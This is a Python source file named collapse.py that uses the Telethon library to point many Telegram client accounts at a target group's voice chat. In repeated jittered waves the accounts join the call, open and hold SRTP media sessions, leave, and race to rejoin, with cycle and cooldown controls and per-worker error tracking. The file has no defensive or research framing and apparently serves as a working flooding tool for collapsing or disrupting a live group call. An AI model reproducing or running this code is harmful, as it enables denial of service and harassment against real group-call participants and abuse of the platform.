# language: Python 3, file: collapse.py
import asyncio, random
from telethon import functions, types
from rtp_hold import open_srtp_session, extract_transport
from bus import bus

async def _get_call(client, entity):
    full = await client(functions.channels.GetFullChannelRequest(entity))
    return full.full_chat.call

async def _join(client, call, entity, held):
    res = await client(functions.phone.JoinGroupCallRequest(
        call=call, join_as=entity, params=types.DataJSON(data="{}")
    ))
    transport = extract_transport(res)
    if transport:
        pc = await open_srtp_session(transport)
        held.append(pc)
    return res

async def _leave(client, call):
    await client(functions.phone.LeaveGroupCallRequest(
        call=call, source=random.randint(0, 2**31)
    ))

async def _wave(clients, jitter_ms, stats, key, fn, *args):
    async def fire(c):
        name = getattr(c, "_session_name", "worker")
        try:
            await asyncio.sleep(random.uniform(0, jitter_ms/1000.0))
            bus.per_worker.setdefault(name, {"op": "-", "errors": 0})
            bus.per_worker[name]["op"] = key
            await fn(c, *args)
            stats[key] += 1
            bus.per_worker[name]["op"] = "-"
        except Exception as e:
            stats["errors"] += 1
            bus.per_worker[name]["errors"] += 1
            bus.emit("error", str(e)[:120], worker=name)
    await asyncio.gather(*(fire(c) for c in clients))

async def collapse_loop(cfg, clients, stats, stop):
    entity = await clients[0].get_entity(cfg["target"]["group"])
    n = 0

    while not stop.is_set():
        jm = bus.params["jitter_ms"]
        hold = bus.params["rtp_hold_sec"]
        if bus.params["cycles"] and n >= bus.params["cycles"]:
            bus.emit("ctl", f"reached cycle cap {n}")
            return
        n += 1; stats["cycles"] = n
        bus.emit("ctl", f"cycle {n} start")

        call = await _get_call(clients[0], entity)
        if call is None:
            await asyncio.sleep(2); continue

        held = []
        await _wave(clients, jm, stats, "join",
                    lambda c, cl=call, ent=entity: _join(c, cl, ent, held))
        stats["media_sessions"] = len(held)
        bus.emit("join", f"wave done, media={len(held)}")

        await asyncio.sleep(hold)

        for pc in held:
            try: await pc.close()
            except Exception: pass
        await _wave(clients, jm, stats, "leave",
                    lambda c, cl=call: _leave(c, cl))
        bus.emit("leave", "wave done")

        if bus.params.get("rejoin_race", True):
            call2 = await _get_call(clients[0], entity)
            if call2:
                held2 = []
                await _wave(clients, jm, stats, "join",
                            lambda c, cl=call2, ent=entity: _join(c, cl, ent, held2))
                await asyncio.sleep(1.0)
                for pc in held2:
                    try: await pc.close()
                    except Exception: pass
                await _wave(clients, jm, stats, "leave",
                            lambda c, cl=call2: _leave(c, cl))

        await asyncio.sleep(bus.params["cooldown_sec"])
